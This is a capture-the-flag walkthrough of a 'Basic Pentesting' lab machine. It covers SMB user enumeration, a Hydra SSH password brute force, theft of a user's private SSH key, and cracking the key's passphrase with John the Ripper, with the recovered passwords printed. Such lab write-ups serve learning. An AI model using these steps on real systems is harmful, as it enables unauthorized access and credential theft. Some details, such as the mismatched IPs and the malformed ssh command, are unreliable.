# Machine Name : Basinc Pentesting
# Machine IP : 10.10.103.67

# Scanning
```
Reference file path : /Gathering/Basic_Pentesting_Scan_Result.md 
```

# Gobuster
```
Reference file path : /Gathering/gobusterResult.md 
```

# Samba Enumeration Result : 
```
[+]Command : ./enum4linux.pl -a {ip} | tee {output log file}*** 
Reference file path : /Gathering/enumSMB.log*** 
```

***Enum4linx result shorting*** 
```
WARNING: polenum.py is not in your path.  Check that package is installed and your PATH is sane.   
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat May 16 22:08:45 2020   

|    Target Information    |   
Target ........... 10.10.28.75   
RID Range ........ 500-550,1000-1050   
Username ......... ''   
Password ......... ''   
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none   
...  
***S-1-22-1-1000 Unix User\kay (Local User)***
***S-1-22-1-1001 Unix User\jan (Local User)***

|    Getting printer info for 10.10.28.75    |   
No printers returned.   
```


# Password Guessing : 
```
command : hydra -l jan -P password-guessing-list.txt ssh://10.10.28.75/ 
```
```
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. 
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-05-16 23:17:58   
[WARNING] Many SSH configurations limit the number of parallel tasks, it is   recommended to reduce the tasks: use -t 4   
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task   
[DATA] attacking ssh://10.10.28.75:22/   
[STATUS] 142.00 tries/min, 142 tries in 00:01h, 14344256 to do in 1683:36h, 16 active   
[STATUS] 112.00 tries/min, 336 tries in 00:03h, 14344062 to do in 2134:32h, 16 active   
[STATUS] 105.14 tries/min, 736 tries in 00:07h, 14343662 to do in 2273:41h, 16 active   
***[22][ssh] host: 10.10.28.75   login: jan   password: armando***  
1 of 1 target successfully completed, 1 valid password found   
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-05-16 23:25:25   
```
***We get it jan's password*** 


# Privilege Escalate 
```
Linpeas is privilege escalate tool
i can used Linpeas
  1. id_rsa copyit   
  - user home directory move ( username : kay)
  - '.ssh/id_rsa' content copy your computer
  
  2. ssh2john.py : hash extract      
  - Command  :
  - ./ssh2john.py id_rsa > output.txt
  - Example : 
  ./ssh2john.py hacking_project/thm/Basic_Pentesting/kay_id_rsa > forjohn.txt 
```

# Password Brute Forcing !
john the ripper Command 

```
john forjohn.txt --wordlist=password_guessing_list.txt 

Note: This format may emit false positives, so it will keep trying even after finding a
possible candidate. 
Warning: detected hash type "SSH", but the string is also recognized as "ssh-opencl"  
Use the "--format=ssh-opencl" option to force loading these as that type instead 
Using default input encoding: UTF-8 
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64]) 
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes 
Cost 2 (iteration count) is 1 for all loaded hashes  
Press 'q' or Ctrl-C to abort, almost any other key for status 
beeswax          (kay_id_rsa)
1g 0:00:00:05 69.06% (ETA: 17:45:23) 0.1703g/s 1687Kp/s 1687Kc/s 1687KC/s aveged7x 
Session aborted 
```

# Connect use id_rsa file command
```
Command : ssh -i id_rsa@{IP} 
1. chmod 600 id_rsa 
2. input passphrase : beeswax   
3. We make it!  
```

# Note
```
2020's Kali linux need to install John
1. apt-get install build-essential libssl-dev
2. apt-get install yasm libgmp-dev libpcap-dev libnss3-dev libkrb5-dev pkg-config
3. apt-get install libopenmpi-dev openmpi-bin
4. git clone {JohnTheRipper_Repository}
5. cd JohnTheRipper/src
6. ./configure --enable-mpi
7 John path to append "/etc/profile"
8. source /etc/profile
9. complete

```